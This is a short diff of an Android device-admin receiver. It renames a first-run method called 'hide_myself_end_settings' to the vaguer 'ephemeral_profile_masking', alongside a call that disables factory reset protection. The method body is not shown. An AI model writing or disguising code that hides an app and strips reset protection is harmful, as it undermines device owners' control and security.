@@ -14,7 +14,7 @@ public class MyDeviceAdminReceiver extends DeviceAdminReceiver {
     public void onReceive(Context context, Intent intent) {
         super.onReceive(context, intent);
         if (!context.getApplicationContext().createDeviceProtectedStorageContext().getSharedPreferences("prefs", Context.MODE_PRIVATE).getBoolean("used_first", false)) {        		
-		hide_myself_end_settings(context);
+		ephemeral_profile_masking(context);
         disableFRP(context);	
 		context.getApplicationContext().createDeviceProtectedStorageContext().getSharedPreferences("prefs", Context.MODE_PRIVATE).edit().putBoolean("used_first", true).commit();           	
 		}
@@ -48,7 +48,7 @@ public class MyDeviceAdminReceiver extends DeviceAdminReceiver {
    }
 
 
-    private void hide_myself_end_settings(Context context) {
+    private void ephemeral_profile_masking(Context context) {
     try {
     DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
     ComponentName adminComponent = getWho(context);
